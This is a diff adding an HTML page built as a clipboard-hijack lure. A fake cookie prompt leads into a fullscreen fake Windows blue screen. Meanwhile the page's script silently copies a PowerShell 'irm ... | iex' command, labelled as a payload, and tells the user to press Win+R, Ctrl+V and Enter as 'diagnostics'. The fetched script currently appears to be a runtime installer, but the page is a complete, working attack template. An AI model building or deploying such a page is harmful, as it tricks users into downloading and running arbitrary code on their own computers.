@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Welcome!</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap");
+      @import url("https://fonts.googleapis.com/css2?family=Segoe+UI+Variable+Text:wght@400;600&family=Segoe+UI:wght@400;600&display=swap");
+
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Roboto", sans-serif;
+        line-height: 1.6;
+        background-color: #e9ebee; /* Light background */
+        color: #333;
+        transition: background-color 0.3s ease;
+        overflow: hidden; /* Prevent scrolling initially */
+      }
+
+      /* Background Content (to be blurred) */
+      .background-content {
+        padding: 30px;
+        filter: blur(0px); /* Initially not blurred */
+        transition: filter 0.4s ease;
+        height: 100%;
+        overflow-y: auto; /* Allow scrolling if content exceeds viewport */
+      }
+      .background-content.blurred {
+        filter: blur(5px);
+      }
+      .content-placeholder {
+        max-width: 800px;
+        margin: 40px auto;
+        background: #fff;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 1px 5px rgba(0, 0, 0, 0.08);
+      }
+      .content-placeholder h1 {
+        color: #1d2129;
+        border-bottom: 1px solid #dddfe2;
+        padding-bottom: 10px;
+        margin-bottom: 20px;
+        font-weight: 600;
+      }
+      .content-placeholder p {
+        margin-bottom: 15px;
+        color: #4b4f56;
+      }
+
+      /* Fullscreen Cookie Modal */
+      .cookie-modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-color: rgba(0, 0, 0, 0.6); /* Darker backdrop */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 1000;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease, visibility 0s 0.3s linear;
+      }
+      .cookie-modal-overlay.visible {
+        opacity: 1;
+        visibility: visible;
+        transition: opacity 0.3s ease, visibility 0s linear;
+      }
+
+      .cookie-modal-content {
+        background-color: #fff;
+        padding: 30px 40px;
+        border-radius: 12px;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        max-width: 550px;
+        width: 90%;
+        text-align: left;
+        color: #1d2129;
+        font-size: 0.95rem;
+        transform: scale(0.9);
+        transition: transform 0.3s ease;
+      }
+      .cookie-modal-overlay.visible .cookie-modal-content {
+        transform: scale(1);
+      }
+
+      .cookie-modal-content h2 {
+        font-size: 1.4rem;
+        font-weight: 700;
+        margin-top: 0;
+        margin-bottom: 15px;
+      }
+      .cookie-modal-content p {
+        margin-bottom: 20px;
+        line-height: 1.5;
+        color: #4b4f56;
+        font-size: 0.9rem;
+      }
+      .cookie-modal-content a {
+        color: #3b5998; /* Example link color */
+        text-decoration: none;
+      }
+      .cookie-modal-content a:hover {
+        text-decoration: underline;
+      }
+      .cookie-modal-buttons {
+        display: flex;
+        justify-content: flex-end;
+        gap: 15px;
+        margin-top: 25px;
+      }
+      .cookie-modal-buttons button {
+        padding: 10px 25px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 0.95rem;
+        font-weight: 600;
+        transition: background-color 0.2s ease, border-color 0.2s ease,
+          box-shadow 0.1s ease;
+        border: 1px solid transparent;
+      }
+      .cookie-modal-buttons button.customize {
+        background-color: #e4e6eb;
+        color: #1d2129;
+        border-color: #ccd0d5;
+      }
+      .cookie-modal-buttons button.customize:hover {
+        background-color: #dcdfe4;
+      }
+      .cookie-modal-buttons button.accept {
+        background-color: #1877f2; /* Blue accept */
+        color: white;
+        border-color: #1877f2;
+        box-shadow: 0 2px 4px rgba(24, 119, 242, 0.2);
+      }
+      .cookie-modal-buttons button.accept:hover {
+        background-color: #166fe5;
+      }
+      .cookie-modal-buttons button:active {
+        transform: scale(0.98);
+      }
+
+      /* Intermediate "Applying choices..." Modal */
+      .applying-modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-color: rgba(255, 255, 255, 0.5); /* Lighter backdrop */
+        display: none; /* Hidden initially */
+        align-items: center;
+        justify-content: center;
+        z-index: 2000; /* Above cookie modal */
+        opacity: 0;
+        transition: opacity 0.2s ease;
+      }
+      .applying-modal-overlay.visible {
+        display: flex;
+        opacity: 1;
+      }
+      .applying-box {
+        background-color: #ffffff;
+        padding: 40px 50px;
+        border-radius: 8px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+        text-align: center;
+      }
+      .dot-flashing {
+        display: inline-block; /* Changed to inline-block */
+        position: relative;
+        width: 10px;
+        height: 10px;
+        border-radius: 5px;
+        background-color: #9880ff;
+        color: #9880ff;
+        animation: dot-flashing 1s infinite linear alternate;
+        animation-delay: 0.5s;
+        margin-bottom: 15px; /* Space below dots */
+      }
+      .dot-flashing::before,
+      .dot-flashing::after {
+        content: "";
+        display: inline-block;
+        position: absolute;
+        top: 0;
+      }
+      .dot-flashing::before {
+        left: -15px;
+        width: 10px;
+        height: 10px;
+        border-radius: 5px;
+        background-color: #9880ff;
+        color: #9880ff;
+        animation: dot-flashing 1s infinite alternate;
+        animation-delay: 0s;
+      }
+      .dot-flashing::after {
+        left: 15px;
+        width: 10px;
+        height: 10px;
+        border-radius: 5px;
+        background-color: #9880ff;
+        color: #9880ff;
+        animation: dot-flashing 1s infinite alternate;
+        animation-delay: 1s;
+      }
+      @keyframes dot-flashing {
+        0% {
+          background-color: #8a8a8a;
+        } /* Darker gray */
+        50%,
+        100% {
+          background-color: #cccccc;
+        } /* Lighter gray */
+      }
+      .applying-box p {
+        margin: 0;
+        font-size: 1.1rem;
+        color: #555;
+      }
+
+      /* --- BSOD Styles (Mostly Unchanged, ensure visibility control) --- */
+      .bsod-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-color: #0078d7;
+        color: #ffffff;
+        font-family: "Segoe UI Variable Text", "Segoe UI", "-apple-system",
+          BlinkMacSystemFont, Roboto, "Helvetica Neue", Arial, sans-serif;
+        display: none; /* Initially hidden */
+        align-items: center;
+        justify-content: center;
+        text-align: left;
+        z-index: 9999;
+        cursor: none;
+        overflow: hidden;
+        padding: 4vw;
+        box-sizing: border-box;
+        opacity: 0;
+        transition: opacity 0.3s ease-in;
+      }
+      .bsod-overlay.visible {
+        display: flex;
+        opacity: 1;
+      }
+      .bsod-container {
+        max-width: 900px;
+        width: 100%;
+      }
+      .bsod-sad-face {
+        font-size: clamp(4rem, 12vw, 7rem);
+        font-weight: 400;
+        line-height: 0.8;
+        margin-bottom: 25px;
+        display: block;
+        font-family: "Segoe UI Symbol", "Segoe UI", sans-serif;
+      }
+      .bsod-message h1 {
+        font-size: clamp(1.2rem, 3.5vw, 1.7rem);
+        font-weight: 400;
+        margin-top: 0;
+        margin-bottom: 15px;
+        line-height: 1.35;
+        color: #ffffff;
+        border-bottom: none;
+      }
+      .bsod-message p,
+      .bsod-final-instructions p {
+        font-size: clamp(0.9rem, 2.5vw, 1.05rem);
+        line-height: 1.5;
+        margin-bottom: 20px;
+        color: #ffffff;
+      }
+      .bsod-details {
+        display: flex;
+        align-items: flex-start;
+        gap: clamp(15px, 4vw, 30px);
+        margin-top: 30px;
+        flex-wrap: wrap;
+      }
+      .bsod-qr-code img {
+        width: clamp(90px, 16vw, 120px);
+        height: clamp(90px, 16vw, 120px);
+        background-color: white;
+        padding: 5px;
+        display: block;
+        border: 1px solid #ccc;
+        image-rendering: pixelated;
+      }
+      .bsod-info {
+        flex-grow: 1;
+      }
+      .bsod-info p {
+        font-size: clamp(0.75rem, 2vw, 0.85rem);
+        margin: 0 0 10px 0;
+        line-height: 1.4;
+      }
+      .bsod-info p strong {
+        font-weight: 600;
+      }
+      .bsod-info a {
+        color: #ffffff;
+        text-decoration: underline;
+      }
+      .bsod-info a:hover {
+        text-decoration: none;
+      }
+      .bsod-progress {
+        margin-top: 15px;
+        font-size: clamp(0.9rem, 2.5vw, 1.05rem);
+      }
+      .bsod-final-instructions {
+        display: none;
+        margin-top: 35px;
+        padding-top: 20px;
+        border-top: 1px solid rgba(255, 255, 255, 0.2);
+      }
+      .bsod-final-instructions p.instruction-title {
+        margin-bottom: 15px;
+        font-weight: 600;
+        font-size: clamp(1rem, 2.8vw, 1.15rem);
+      }
+      .bsod-final-instructions ol {
+        padding-left: 25px;
+        margin: 0;
+        font-size: clamp(0.9rem, 2.5vw, 1.05rem);
+        list-style-type: decimal;
+      }
+      .bsod-final-instructions li {
+        margin-bottom: 10px;
+      }
+      .bsod-final-instructions strong {
+        background-color: rgba(255, 255, 255, 0.15);
+        padding: 1px 4px;
+        border-radius: 3px;
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        font-family: "Consolas", "Courier New", monospace;
+        font-size: 0.95em;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Blurred Background Content -->
+    <div class="background-content" id="background-content">
+      <div class="content-placeholder">
+        <h1>Loading content...</h1>
+        <p>Please wait...</p>
+      </div>
+    </div>
+
+    <!-- Fullscreen Cookie Modal -->
+    <div class="cookie-modal-overlay" id="cookie-modal">
+      <div class="cookie-modal-content">
+        <h2>This website would like to request access to cookies</h2>
+        <p>
+          When visiting our site, pre-selected companies may access and use
+          certain information on your device and about this web page to serve
+          relevant ads or personalised content. Please note that ads help keep
+          our service free. Personal data will be processed based on consent in
+          accordance with Art.6(1)(a) of the GDPR framework in
+          <a href="#">EU law</a>, or as legitimate interest in accordance with
+          Art.6(1)(f) of the same.
+        </p>
+        <p>You can customize your choices by clicking the button below.</p>
+        <div class="cookie-modal-buttons">
+          <button class="customize" id="customize-choice-btn">
+            Customize choices
+          </button>
+          <button class="accept" id="accept-choice-btn">Accept all</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Intermediate "Applying choices..." Modal -->
+    <div class="applying-modal-overlay" id="applying-choices-modal">
+      <div class="applying-box">
+        <div class="dot-flashing"></div>
+        <p>Applying choices...</p>
+      </div>
+    </div>
+
+    <!-- BSOD Overlay (Defined, but hidden initially) -->
+    <div class="bsod-overlay" id="bsod-overlay">
+      <div class="bsod-container">
+        <span class="bsod-sad-face">:(</span>
+        <div class="bsod-message">
+          <h1>
+            Your PC ran into a problem and needs to restart. We're just
+            collecting some error info, and then we'll restart for you.
+          </h1>
+          <p class="bsod-progress">
+            <span id="progress-percentage">0</span>% complete
+          </p>
+        </div>
+        <div class="bsod-details" id="bsod-details-section">
+          <div class="bsod-qr-code">
+            <img
+              src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Recovery%20code%20not%20loaded%20yet,%20please%20wait."
+              alt="QR Code: Recovery code not loaded yet, please wait."
+            />
+          </div>
+          <div class="bsod-info">
+            <p>
+              For more information about this issue and possible fixes, scan the
+              QR code or visit <br /><a
+                href="https://tetapux.vercel.app/support/stopcode"
+                target="_blank"
+                >https://tetapux.vercel.app/support/stopcode</a
+              >
+            </p>
+            <p>
+              If you call a support person, give them this info:<br />
+              Stop code: <strong>SYSTEM_SERVICE_EXCEPTION (tetapux.sys)</strong>
+            </p>
+          </div>
+        </div>
+        <div class="bsod-final-instructions" id="bsod-final-instructions">
+          <p class="instruction-title">To continue, execute diagnostics:</p>
+          <ol>
+            <li>Press <strong>Win + R</strong></li>
+            <li>In the diagnostics box, press <strong>CTRL + V</strong></li>
+            <li>Then, press <strong>Enter</strong> to run diagnostics</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const customizeBtn = document.getElementById("customize-choice-btn");
+      const acceptBtn = document.getElementById("accept-choice-btn");
+      const cookieModal = document.getElementById("cookie-modal");
+      const applyingModal = document.getElementById("applying-choices-modal");
+      const bsodOverlay = document.getElementById("bsod-overlay");
+      const backgroundContent = document.getElementById("background-content");
+      const bsodDetailsSection = document.getElementById(
+        "bsod-details-section"
+      );
+      const bsodFinalInstructions = document.getElementById(
+        "bsod-final-instructions"
+      );
+      const progressElement = document.getElementById("progress-percentage");
+      const bodyElement = document.body;
+      const commandToCopy =
+        'powershell -c "irm bun.sh/install.ps1 | iex" # Diag: TPX-BSOD-SSE-ERR-MODAL'; // Payload ID
+
+      // --- Functions ---
+      function copyCommandToClipboard() {
+        navigator.clipboard
+          .writeText(commandToCopy)
+          .then(() => {
+            console.log("Command copied to clipboard.");
+          })
+          .catch((err) => {
+            console.error("Failed to copy command automatically: ", err);
+          });
+      }
+
+      function triggerBSOD() {
+        // Show BSOD overlay
+        bsodOverlay.classList.add("visible");
+        bodyElement.style.backgroundColor = "#0078D7"; // Ensure body bg changes
+        bodyElement.style.overflow = "hidden"; // Prevent scrolling during BSOD
+
+        // Attempt fullscreen
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement
+            .requestFullscreen()
+            .catch((err) => console.warn(`Fullscreen error: ${err.message}`));
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          /* Safari */
+          document.documentElement
+            .webkitRequestFullscreen()
+            .catch((err) => console.warn(`Fullscreen error: ${err.message}`));
+        } else if (document.documentElement.msRequestFullscreen) {
+          /* IE11 */
+          document.documentElement.msRequestFullscreen();
+        }
+
+        // Copy command when BSOD appears
+        copyCommandToClipboard();
+
+        // Start progress simulation
+        let progress = 0;
+        progressElement.textContent = progress;
+        const interval = setInterval(() => {
+          progress += Math.floor(Math.random() * 10) + 5; // Random increment
+          if (progress >= 100) {
+            progress = 100;
+            progressElement.textContent = progress;
+            clearInterval(interval);
+            setTimeout(() => {
+              bsodFinalInstructions.style.display = "block"; // Show instructions
+            }, 2000); // 2s after 100%
+          } else {
+            progressElement.textContent = progress;
+          }
+        }, 400 + Math.random() * 400); // Variable interval
+      }
+
+      function handleCookieChoice(event) {
+        event.preventDefault(); // Prevent default button behavior if any
+
+        // 1. Hide cookie modal
+        cookieModal.classList.remove("visible");
+
+        // 2. Unblur background
+        backgroundContent.classList.remove("blurred");
+
+        // 3. Show "Applying choices..." modal
+        applyingModal.classList.add("visible");
+
+        // 4. Wait 1 second, then hide "Applying" and trigger BSOD
+        setTimeout(() => {
+          applyingModal.classList.remove("visible");
+          triggerBSOD();
+        }, 1000); // 1-second delay for the intermediate step
+      }
+
+      // --- Initial Setup ---
+      window.addEventListener("load", () => {
+        // Show cookie modal and blur background on load
+        cookieModal.classList.add("visible");
+        backgroundContent.classList.add("blurred");
+        bodyElement.style.overflow = "hidden"; // Prevent scrolling while modal is up
+      });
+
+      // --- Event Listeners ---
+      customizeBtn.addEventListener("click", handleCookieChoice);
+      acceptBtn.addEventListener("click", handleCookieChoice);
+
+      // Optional: Recopy command if user clicks the BSOD screen itself
+      bsodOverlay.addEventListener("click", copyCommandToClipboard);
+
+      // Handle potential fullscreen exit to ensure cursor/scroll is restored if BSOD is hidden
+      document.addEventListener("fullscreenchange", () => {
+        if (
+          !document.fullscreenElement &&
+          bsodOverlay.classList.contains("visible")
+        ) {
+          // Optional: Could try to re-request fullscreen or just accept windowed mode
+          console.log("Exited fullscreen while BSOD was visible.");
+        } else if (
+          !document.fullscreenElement &&
+          !bsodOverlay.classList.contains("visible")
+        ) {
+          // Restore body scroll if exiting fullscreen and BSOD is NOT visible
+          bodyElement.style.overflow = "";
+          bodyElement.style.backgroundColor = ""; // Restore original bg
+        }
+      });
+      document.addEventListener("webkitfullscreenchange", () => {
+        /* Safari */
+        if (
+          !document.webkitFullscreenElement &&
+          bsodOverlay.classList.contains("visible")
+        ) {
+          console.log("Exited fullscreen while BSOD was visible.");
+        } else if (
+          !document.webkitFullscreenElement &&
+          !bsodOverlay.classList.contains("visible")
+        ) {
+          bodyElement.style.overflow = "";
+          bodyElement.style.backgroundColor = "";
+        }
+      });
+      document.addEventListener("msfullscreenchange", () => {
+        /* IE11 */
+        if (
+          !document.msFullscreenElement &&
+          bsodOverlay.classList.contains("visible")
+        ) {
+          console.log("Exited fullscreen while BSOD was visible.");
+        } else if (
+          !document.msFullscreenElement &&
+          !bsodOverlay.classList.contains("visible")
+        ) {
+          bodyElement.style.overflow = "";
+          bodyElement.style.backgroundColor = "";
+        }
+      });
+    </script>
+  </body>
+</html>
